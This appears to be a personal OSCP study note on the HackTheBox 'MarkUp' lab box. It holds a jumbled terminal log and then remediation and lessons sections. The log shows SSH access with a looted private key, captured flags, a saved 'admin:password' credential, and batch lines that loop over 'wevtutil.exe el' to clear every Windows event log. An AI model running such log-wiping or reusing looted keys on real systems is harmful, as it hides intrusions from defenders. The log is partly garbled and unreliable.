kali@kali:~/Platforms/HackTheBox/MarkUp [15:59:05] $ [?1h=[?2004hssh -i $BoxDir/loot/daniel_id_rsa daniel@$BoxIPssh[?1l>[?2004l
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10                                   Mandatory group,
$ [16:03:06] loot flag user 032d2fc8952a8c24e39c8f0ee9918ef7
[?25h[?25lNT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10                                   Mandatory group,
Password last set            4/21/2020 5:09:42 AM
Password changeable          4/21/2020 5:09:42 AM
User may change password     Yes
kali@kali:~/Platforms/HackTheBox/MarkUp [15:41:45] $ [?1h=[?2004hloot flag userloot 032d2fc8952a8c24e39c8f0ee9918ef7 [?1l>[?2004l
[+] Flag saved:  user = 032d2fc8952a8c24e39c8f0ee9918ef7  →  loot/flags.txt
FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")
FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V[?25h[?25l
for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")[?25h[?25l
$ [16:44:26] ssh -i $BoxDir/loot/daniel_id_rsa daniel@$BoxIP
kali@kali:~/Platforms/HackTheBox/MarkUp [16:43:34] $ [?1h=[?2004hssh -i $BoxDir/loot/daniel_id_rsa daniel@$BoxIPssh[?1l>[?2004l
$ [16:45:12] ssh -i $BoxDir/loot/daniel_id_rsa daniel@$BoxIP
kali@kali:~/Platforms/HackTheBox/MarkUp [16:44:44] $ [?1h=[?2004hssh -i $BoxDir/loot/daniel_id_rsa daniel@$BoxIPssh[?1l>[?2004l
$ [16:49:22] ssh -i $BoxDir/loot/daniel_id_rsa daniel@$BoxIP
cat $BoxDir/loot/flags.txt
$ [17:09:12] loot cred admin password
loot flag user 032d2fc8952a8c24e39c8f0ee9918ef7
loot flag root f574a3e7650cebd8c39784299cb570f8
kali@kali:~/Platforms/HackTheBox/MarkUp [17:08:40] $ [?1h=[?2004hloot cred admin password
loot flag root f574a3e7650cebd8c39784299cb570f8loot
[+] Cred saved:  admin:password  →  loot/creds.txt
[+] Flag saved:  root = f574a3e7650cebd8c39784299cb570f8  →  loot/flags.txt
admin:password
kali@kali:~/Platforms/HackTheBox/MarkUp [17:11:36] 4C"tokens=1,2*"'bcdedit'
for"tokens=*"'wevtutil.exe el'"%%G"
127.0.0.1 - - [28/Aug/2026 17:42:52] code 404, messagr /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")
```


## Remediation recommendations

| Finding | Recommendation |
|---|---|
| Initial access path on MarkUp | Remove or patch the vulnerable service, restrict exposure, and rotate any credentials recovered during testing. |
| Privilege escalation path | Remove the misconfiguration, enforce least privilege, and verify the corrected permissions or policy. |
| Assessment artifacts | Remove payloads and temporary files, restore modified files, and review logs for the test activity. |

## Lessons learned and vault links

- XML parsers can read local files when external entities are enabled.
- A scheduled task is an escalation path when its script is writable by the current user.

### Related boxes

- [[OSCP/BOXES/WRITE UPS/Windows/Jerry|Jerry]] -- shares a similar enumeration or escalation pattern
- [[OSCP/BOXES/WRITE UPS/Windows/Servmon|Servmon]] -- shares a similar enumeration or escalation pattern

## External resources

- https://www.exploit-db.com/search?q=MarkUp
- https://ippsec.rocks/?q=MarkUp

## Related RUNBOOK V2 stages

- [[OSCP/RUNBOOK V2/Start Here]]
- [[OSCP/RUNBOOK V2/Windows - Service Scan]]
- [[OSCP/RUNBOOK V2/Windows - Web Enum]]
- [[OSCP/RUNBOOK V2/Windows - Shell Received]]
- [[OSCP/RUNBOOK V2/Windows - Privilege Triage]]
- [[OSCP/RUNBOOK V2/Windows - Clean Down]]

## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
